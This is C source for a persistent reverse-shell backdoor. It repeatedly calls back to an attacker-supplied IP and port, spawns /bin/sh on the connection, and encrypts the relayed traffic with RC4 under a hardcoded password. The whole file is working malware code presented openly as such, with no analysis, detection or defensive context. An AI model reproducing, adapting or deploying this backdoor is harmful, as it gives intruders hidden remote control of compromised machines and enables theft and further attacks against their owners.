#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "rc4.h"

#define max(a, b) ((a) > (b) ? (a):(b))

char password[] = "m4st3rh4x0r";

int tag;

void do_connect(char *, int);
int shell(int);

int
main(void)
{
  char *target = NULL;
  int port = 18374;

  if (!getenv("TARGET"))
    exit(-1);

  target = getenv("TARGET");

  if (getenv("PORT"))
    port = atoi(getenv("PORT"));

  while (1) {
    do_connect(target, port);
    sleep(60 * 10);
  }
}

void do_connect(char *target, int port)
{
  int sockfd;
  struct sockaddr_in sin;

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    return;

  sin.sin_port = htons(port);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(target);

  if (connect(sockfd, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
    close(sockfd);
    return;
  }

  shell(sockfd);
  close(sockfd);
}

void sighandler(int sig) { tag = 1; }

int shell(int sockfd)
{
  int n;
  char buf[1024];
  fd_set rfds;
  int fmax;
  int sockpair[2];

  tag = 0;
  socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
  fmax = max(sockpair[1], sockfd) + 1;

  signal(SIGALRM, sighandler);

  switch (fork()) {
   case 0:
     dup2(sockpair[0], 0);
     dup2(sockpair[0], 1);
     dup2(sockpair[0], 2);

     system("/bin/sh");

     kill(getppid(), SIGALRM);
     exit(-1);
   case -1:
     return (-1);
   default:
     for(;;) {
       FD_ZERO(&rfds);
       FD_SET(sockfd, &rfds);
       FD_SET(sockpair[1], &rfds);

       select(fmax, &rfds, NULL, NULL, NULL);

       if(FD_ISSET(sockpair[1], &rfds)) {

         if(tag)
           return(-1);

	 if((n = read(sockpair[1], buf, sizeof(buf))) <= 0) 
           return(-1);
         
         rc4crypt(password, strlen(password), buf, n);

	 if(write(sockfd, buf, n) < 0)
           return(-1);
       }

       if(FD_ISSET(sockfd, &rfds)) {

         if(tag)
           return(-1);

	 if((n = read(sockfd, buf, sizeof(buf))) <= 0) {
           write(sockpair[1], "exit", 4);
           return(-1);
         }
          
         rc4crypt(password, strlen(password), buf, n);

	 if(write(sockpair[1], buf, n) < 0) 
           return(-1);
         
       }
     }
  }
}
